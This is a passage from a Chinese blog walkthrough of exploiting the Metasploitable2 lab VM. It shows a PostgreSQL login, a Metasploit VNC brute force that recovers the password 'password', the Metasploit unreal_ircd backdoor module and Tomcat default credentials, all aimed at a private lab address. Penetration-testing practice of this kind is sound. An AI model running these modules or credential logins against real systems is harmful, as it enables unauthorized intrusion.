+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psql -h 192.168.209.153 -p 5432 -d postgres -U postgres</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+<p><img   lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-07-03%20180127.png" ></p>
+<h3 id="5900端口vnc服务爆破"><a href="#5900端口vnc服务爆破" class="headerlink" title="5900端口vnc服务爆破"></a>5900端口vnc服务爆破</h3><div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search vuc_login</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.209.153</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+<p>获取账号密码，账号为空密码password<br>Successful: :password<br>使用vnc连接<br><img   lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-07-04%20142238.png" ></p>
+<h3 id="6697-IRC服务后门漏洞-unreal-ircd"><a href="#6697-IRC服务后门漏洞-unreal-ircd" class="headerlink" title="6697 IRC服务后门漏洞(unreal_ircd)"></a>6697 IRC服务后门漏洞(unreal_ircd)</h3><div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search unreal_ircd</span><br><span class="line">use 0</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.209.153</span><br><span class="line">run</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+<p><img   lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-07-04%20150247.png" ></p>
+<h3 id="8180-Apache-Tomcat-5-5后门-CVE-2019-0232"><a href="#8180-Apache-Tomcat-5-5后门-CVE-2019-0232" class="headerlink" title="8180&#x2F;Apache Tomcat&#x2F;5.5后门(CVE-2019-0232)"></a>8180&#x2F;Apache Tomcat&#x2F;5.5后门(CVE-2019-0232)</h3><div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.209.153/admin <span class="comment">#默认密码tomcat/tomcat</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div></div><div class="post-reward"><div class="post-reward-btn" title="赞赏作者"><img src="/assets/images/svg/uc/uc-gift.svg" class="icon noview" alt="Icon"><span></span></div><div class="post-reward-content"><div class="post-reward-text"></div><div class="post-reward-list"><a href="/null" target="_blank">致谢名单</a></div></div></div><div class="post-copyright"><div class="post-copyright-info">本作品由 stackTang 于 2026-06-22 20:48:39 发布</div><div class="post-copyright-link"><span>作品地址：<a href="http://example.com/2026/06/22/Metasploitable2%E9%9D%B6%E6%9C%BA%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/">Metasploitable2靶机漏洞详解</a></span><button class="copy-text" type="button" data-text="http://example.com/2026/06/22/Metasploitable2%E9%9D%B6%E6%9C%BA%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/">复制</button></div><div class="post-copyright-detail">除特别声明外，本站作品均采用 <a href='https://creativecommons.org/licenses/by-nc-sa/4.0/' title='Attribution-NonCommercial-ShareAlike' target='_blank'>CC BY-NC-SA 4.0</a> 许可协议，转载请注明来自 <a href='/'>stackTang Blog</a></div><img class="post-copyright-icon noview" src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></div><div class="post-tail-tags"><a class="post-tail-tags-link" href="/tags/%E6%8A%80%E5%B7%A7/" rel="tag">技巧</a><a class="post-tail-tags-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></div><div class="post-nav"><a class="post-nav-prev" href="/2026/06/22/Linux%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95/" title="Linux内核调试">上一篇<span>Linux内核调试</span></a><a class="post-nav-next" href="/2026/06/22/Radare2/" title="Radare2">下一篇<span>Radare2</span></a></div><div class="comment"><div id="waline"></div></div></div><aside id="post-sidebar" status="show"><div id="toc-container"><div class="toc-title"><img src="/assets/images/svg/ta/ta-toc.svg" class="icon noview" alt="Icon"><span>目录</span></div><div class="toc-content" id="toc-div"><ol class="toc-list"><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#704%E6%97%A5%E5%BF%97"><span class="toc-list-text">704日志</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#Metasploitable2%E9%9D%B6%E6%9C%BA%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3"><span class="toc-list-text">Metasploitable2靶机漏洞详解:</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#21%E7%AC%91%E8%84%B8%E6%BC%8F%E6%B4%9E"><span class="toc-list-text">21笑脸漏洞</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#22ssh%E6%9C%8D%E5%8A%A1-23telnet%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-list-text">22ssh服务&#x2F;23telnet弱口令</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#111-rpcbind%E6%BC%8F%E6%B4%9E"><span class="toc-list-text">111-rpcbind漏洞</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#80Apache-PHP-CGI%E6%9F%A5%E8%AF%A2%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%82%E6%95%B0%E6%BC%8F%E6%B4%9E"><span class="toc-list-text">80Apache(PHP-CGI查询字符串参数漏洞)</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#139-445-Smb%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E"><span class="toc-list-text">139&#x2F;445 Smb服务漏洞</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#1099-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2011-3556"><span class="toc-list-text">1099 Java反序列化命令执行漏洞(cve-2011-3556)</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#1524-%E2%80%9Cingreslock%E2%80%9D%E5%90%8E%E9%97%A8"><span class="toc-list-text">1524 “ingreslock”后门</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#3306-MySQL-%E7%88%86%E7%A0%B4-%E7%A9%BA%E5%AF%86%E7%A0%81"><span class="toc-list-text">3306 MySQL 爆破&amp;空密码</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#5432%E7%AB%AF%E5%8F%A3postgresq%E7%88%86%E7%A0%B4"><span class="toc-list-text">5432端口postgresq爆破</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#5900%E7%AB%AF%E5%8F%A3vnc%E6%9C%8D%E5%8A%A1%E7%88%86%E7%A0%B4"><span class="toc-list-text">5900端口vnc服务爆破</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#6697-IRC%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E-unreal-ircd"><span class="toc-list-text">6697 IRC服务后门漏洞(unreal_ircd)</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#8180-Apache-Tomcat-5-5%E5%90%8E%E9%97%A8-CVE-2019-0232"><span class="toc-list-text">8180&#x2F;Apache Tomcat&#x2F;5.5后门(CVE-2019-0232)</span></a></li></ol></li></ol></li></ol></div></div></aside></div></div><div id="toolbar" hide=""><div id="toolbar-setting-container" hide=""><div class="toolbar-item"><button id="tool-color-mode" title="深色模式" type="button"><img src="/assets/images/svg/ta/ta-moon.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button class="copy-text" id="tool-share" title="分享" type="button" data-text="http://example.com/2026/06/22/Metasploitable2%E9%9D%B6%E6%9C%BA%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/"><img src="/assets/images/svg/ta/ta-share.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-font-size-plus" title="放大字体" type="button"><img src="/assets/images/svg/ta/ta-text-plus.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-font-size-minus" title="缩小字体" type="button"><img src="/assets/images/svg/ta/ta-text-minus.svg" class="icon noview" alt="Icon"></button></div></div><div class="toolbar-container"><div class="toolbar-item"><button id="tool-setting" title="设置" type="button"><img src="/assets/images/svg/ta/ta-setting.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-toc" title="目录" type="button"><img src="/assets/images/svg/ta/ta-toc.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-gototop" title="返回顶部" type="button"><img src="/assets/images/svg/ta/ta-up.svg" class="icon noview" alt="Icon"></button></div></div></div><div class="search-overlay"><div class="search-container"><div class="search-header"><div class="search-title"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 10m-7 0a7 7 0 1 0 14 0a7 7 0 1 0 -14 0" /><path d="M21 21l-6 -6" /></svg>
+搜索</div><div class="search-close-btn"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 21a9 9 0 0 0 9 -9a9 9 0 0 0 -9 -9a9 9 0 0 0 -9 9a9 9 0 0 0 9 9z" /><path d="M9 8l6 8" /><path d="M15 8l-6 8" /></svg></div></div><div class="search-input-box"><input id="search-input" type="search" placeholder="请输入关键词进行站内搜索……" value="" maxlength="80"/></div><div class="search-result-container"><div class="search-result-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 10m-7 0a7 7 0 1 0 14 0a7 7 0 1 0 -14 0" /><path d="M21 21l-6 -6" /></svg></div></div></div></div><div id="music-player"></div></main><footer><div class="footer"><div id="footer-copyright">© 2026 <span>💗</span> <a href="/null">stackTang</a></div><div id="footer-info"><div id="footer-framework">🚀本站由 <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/chanwj/hexo-theme-meow" title="3.3.2" target="_blank">Meow</a> 强力驱动</div><div id="footer-runtime"><span id="runtime" data-startdate="2026-07-13T23:13:13.000Z">🌻已稳定运行.年.月.天</span></div></div></div></footer><div class="scripts"><script>const GLOBALCONFIG = {
+  root: '/',
+  toolbar: true,
+  lazyload_src: '/assets/images/Meow-Loading.webp',
+  friends: false,
+  album: '',
+  codeblock: true,
+  code_copy_text: false,
+  share_text: '🐱Share From Meow',
+  onblur_title: 'Please Come Back～✧(´▽`ʃ♡ƪ)',
+  mouse_click: false,
+  notify:{
+    enable: false,
+    info: '复制成功～转载请标注本文地址',
+    f12_info: '开发者模式已打开，请遵循本站版权协议'
+  },
+  search: {
+    enable: true,
+    path: 'search.xml',
+    local: {
+      top_n_per_article: 1,
+      preload: false
+    }
+  },
+  encrypt: false,
+  category: false,
+};
+</script><script>if (!localStorage.getItem('color-mode')) {
+  localStorage.setItem('color-mode', 'light' || 'light');
+}
+document.body.setAttribute('data-mode', localStorage.getItem('color-mode'));
+</script>
+<script src="/js/theme/tools/utils.js"></script>
+
+<script src="/js/plugins/dist/lazyload.min.js"></script>
+
+<script src="/js/plugins/view-image.min.js"></script>
+<script>if (localStorage.getItem('font-size')) {
+  document.querySelector('.post').style.fontSize = localStorage.getItem('font-size') + 'px';
+}
+</script><script>(() => {
+  let initFn = window.walineFn || null
+
+  const initWaline = (Fn) => {
+    const waline = Fn(Object.assign({
+      el: '#waline',
+      serverURL: 'https://dischat-9perr1k34-tangriweilis-projects.vercel.app',
+      lang: 'zh-CN',
+      dark: 'body[data-mode="dark"]',
+      emoji: null,
+      reaction: null,
+      path: window.location.pathname.replace(/([^\/#]+)(?:#.+|)$/,'$1/'),
+    }, null))
+  }
+
+  const loadWaline = async () => {
+    if (initFn) initWaline(initFn)
+    else {
+      let jsPath = ''
+      if (false) {
+        jsPath = 'dist/waline.js'
+      } else {
+        jsPath = '/js/plugins/dist/waline.js'
+      }
+      const { init } = await import(jsPath)
+      initFn = init || Waline.init
+      initWaline(initFn)
+      window.walineFn = initFn
+    }
+  }
+
+  if (true) {
+    meow.lazyloadFn(document.getElementById('waline'), loadWaline)
+  } else {
+    loadWaline()
+  }
+})()</script>
+<script src="/js/plugins/dist/APlayer.min.js"></script>
+<script>const initAplayer = (data) => {
+  if (!data.length) return;
+
+  const ap = new APlayer({
+    container: document.getElementById('music-player'),
+    fixed: true,
+    autoplay: false,
+    theme: '#FFB347',
+    loop: 'all',
+    order: 'list',
+    volume: 0.7,
+    lrcType: 3,
+    audio: data
+  });
+
+  ap.on('play', () => {
+    document.getElementById('music-player').setAttribute("play", "");
+  });
+  ap.on('pause', () => {
+    document.getElementById('music-player').removeAttribute("play");
+  });
+};
+
+const fetchData = () => {
+  fetch('')
+    .then(res => res.json())
+    .then(result => initAplayer(result));
+};
+
+if ('') {
+  document.addEventListener("DOMContentLoaded", fetchData);
+} else {
+  document.addEventListener("DOMContentLoaded", initAplayer());;
+}</script>
+<script src="/js/plugins/dist/search.js"></script>
+
+<script src="/js/main.js" type="module"></script>
+<script src="https://fastly.jsdelivr.net/npm/live2d-widget@3.1.4/lib/L2Dwidget.min.js"></script><script>(function () {
+  const initLive2D = function () {
+    if (!window.L2Dwidget) return;
+    window.L2Dwidget.init({"model":{"jsonPath":"https://fastly.jsdelivr.net/npm/live2d-widget-model-hijiki@1.0.5/assets/hijiki.model.json","scale":1},"display":{"position":"right","width":150,"height":300,"hOffset":150,"vOffset":-15},"mobile":{"show":true,"scale":0.55},"react":{"opacityDefault":0.88,"opacityOnHover":0.25}});
+  };
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initLive2D, { once: true });
+  } else {
+    initLive2D();
+  }
+})();</script></div></body></html>
